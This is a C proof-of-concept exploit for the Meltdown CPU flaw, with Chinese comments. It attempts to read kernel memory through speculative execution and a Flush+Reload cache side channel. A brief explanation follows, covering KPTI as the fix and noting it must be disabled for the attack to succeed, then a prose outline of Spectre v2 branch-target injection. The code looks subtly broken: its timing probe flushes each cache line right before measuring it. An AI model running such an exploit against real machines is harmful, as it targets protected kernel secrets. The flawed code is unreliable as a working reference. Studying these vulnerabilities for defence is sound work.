#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

#define CACHE_LINE_SIZE 64
#define THRESHOLD 100

jmp_buf env;

void sigsegv_handler(int sig) {
    longjmp(env, 1);
}

// 探测缓存
int probe(uint8_t *addr) {
    _mm_clflush(addr);
    _mm_mfence();
    uint64_t start = __rdtsc();
    volatile uint8_t tmp = *addr;
    uint64_t end = __rdtsc();
    return (end - start) < THRESHOLD;
}

int main() {
    // 设置信号处理，捕获段错误
    signal(SIGSEGV, sigsegv_handler);

    // 目标内核地址（示例，实际需根据系统确定）
    uint8_t *kernel_addr = (uint8_t*)0xffffffff81000000;

    // 准备一个探测数组（用户空间）
    uint8_t probe_array[256 * CACHE_LINE_SIZE];
    for (int i = 0; i < 256; i++) {
        probe_array[i * CACHE_LINE_SIZE] = 0;
    }

    // 尝试读取内核内存的每个字节
    for (int byte_idx = 0; byte_idx < 16; byte_idx++) {
        uint8_t *target = kernel_addr + byte_idx;

        if (setjmp(env) == 0) {
            // 触发乱序执行：访问内核地址，然后使用该值索引probe_array
            // 注意：直接访问会触发段错误，但乱序执行会先进行
            volatile uint8_t tmp = *target;  // 触发异常
            // 以下代码在乱序执行中会被执行
            uint8_t val = tmp;
            volatile uint8_t dummy = probe_array[val * CACHE_LINE_SIZE];
            // 此时probe_array[val*64]被加载到缓存
        }
        // 异常处理后会跳到这里

        // 探测probe_array中哪个索引被缓存
        for (int i = 0; i < 256; i++) {
            if (probe(&probe_array[i * CACHE_LINE_SIZE])) {
                printf("Byte %d: value %d (0x%02x)\n", byte_idx, i, i);
                break;
            }
        }

        // 清除缓存
        _mm_mfence();
    }

    return 0;
}


该POC利用`setjmp`/`longjmp`捕获异常，在异常处理前乱序执行访问`probe_array[val*64]`。通过Flush+Reload探测哪个缓存行被加载，从而推断`val`。注意：现代系统需要禁用KPTI或使用旧内核才能成功。修复方法：KPTI（KAISER）将内核页表与用户隔离，使Meltdown无法读取内核内存。

Spectre v2（CVE-2017-5715）利用分支目标缓冲区（BTB）的预测机制。攻击者通过执行精心选择的分支指令，污染BTB，使受害者的间接分支（如函数指针调用）预测到攻击者控制的地址。当受害者执行间接分支时，CPU会预测到恶意地址并乱序执行其中的代码，从而泄露敏感数据。攻击者需要与受害者共享同一BTB（通常在同一CPU核心或SMT线程）。

